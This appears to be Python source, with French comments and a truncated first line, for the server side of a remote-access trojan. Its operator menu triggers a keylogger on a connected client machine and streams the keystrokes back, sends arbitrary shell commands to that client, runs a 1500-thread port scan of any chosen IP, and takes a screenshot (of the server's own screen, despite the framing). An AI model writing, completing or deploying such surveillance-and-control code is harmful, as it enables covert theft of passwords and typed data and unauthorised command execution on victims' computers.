rom socket import socket, AF_INET, SOCK_STREAM
import os
from PIL import ImageGrab
from concurrent.futures import ThreadPoolExecutor
import time

# Paramètres du serveur
IP = "0.0.0.0"
PORT = 12345

# Initialisation du socket
connection = socket(AF_INET, SOCK_STREAM)
connection.bind((IP, PORT))
connection.listen(5)
print(f"Server listening on {IP}:{PORT}")

# Accepter la connexion du client
client, addr = connection.accept()
print("Connected by", addr)

# Fonction qui scanne les ports et vérifie l'état de chaque port
def scanner_port(cible, port):
    try:
        with socket(AF_INET, SOCK_STREAM) as s:
            s.settimeout(1)
            resultat = s.connect_ex((cible, port))
            if resultat == 0:
                print(f"[+] Port {port} ouvert")
    except Exception:
        pass

# Fonction qui gère le scan de plusieurs ports en parallèle
def scanneur_ports(cible, ports, threads=100):
    print(f"Scan de {cible} pour les ports : {ports} en utilisant {threads} threads")  
    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(lambda p: scanner_port(cible, p), ports)

# Fonction pour capturer une capture d'écran
def take_screenshot():
    user_profile = os.environ.get("USERPROFILE") or os.environ.get("HOME")
    desktop_path = os.path.join(user_profile, "Desktop")
    screenshot_path = os.path.join(desktop_path, "screenshot.png")
    screenshot = ImageGrab.grab()
    screenshot.save(screenshot_path)
    print(f"Screenshot taken and saved as {screenshot_path}")

# Fonction pour exécuter une commande personnalisée
def execute_custom_command():
    while True:
        cmd = input("Enter a command to execute (e.g., dir or ls): ")
        client.sendall(cmd.encode())
        response = client.recv(1024).decode()
        print(f"Output:\n{response}")

        print("\n1: Enter another command")
        print("2: Return to main menu")
        print("3: Exit")

        choice = input("Select an option: ")
        if choice == "1":
            continue
        elif choice == "2":
            return
        elif choice == "3":
            print("Closing connection.")
            client.sendall(b"quit")
            client.close()
            exit()
        else:
            print("Invalid option, returning to main menu.")
            return

# Fonction pour activer le keylogger avec une durée déterminée
def start_keylogger():
    print("Activating keylogger on client...")
    client.sendall(b"keylogger")
    print("Keylogger started.\n")

    try:
        duration = int(input("Enter the duration for keylogger (in seconds): "))
    except ValueError:
        print("Invalid input. Defaulting to 30 seconds.")
        duration = 30

    start_time = time.time()

    while time.time() - start_time < duration:
        try:
            client.settimeout(1)
            keystrokes = client.recv(1024).decode()
            print(keystrokes, end="", flush=True)
        except TimeoutError:
            continue
        except Exception as e:
            print(f"\nError during keylogger: {e}")
            break

    print("\nKeylogger session finished. Returning to menu.")

# Fonction pour afficher le menu principal
def show_menu():
    print("\nMenu:")
    print("1: Start Keylogger")
    print("2: Scan Ports")
    print("3: Take Screenshot")
    print("4: Execute Custom Command")
    print("5: Quit")

    choice = input("Select an option: ")

    if choice == "1":
        start_keylogger()
    elif choice == "2":
        cible_ip = input("Enter target IP for port scan: ")
        ports_to_scan = range(20, 65535)
        threads = 1500
        scanneur_ports(cible_ip, ports_to_scan, threads=threads)
    elif choice == "3":
        take_screenshot()
    elif choice == "4":
        execute_custom_command()
    elif choice == "5":
        print("Closing connection.")
        client.sendall(b"quit")
        client.close()
        exit()
    else:
        print("Invalid option, try again.")

# Boucle principale pour gérer les commandes du client
while True:
    show_menu()
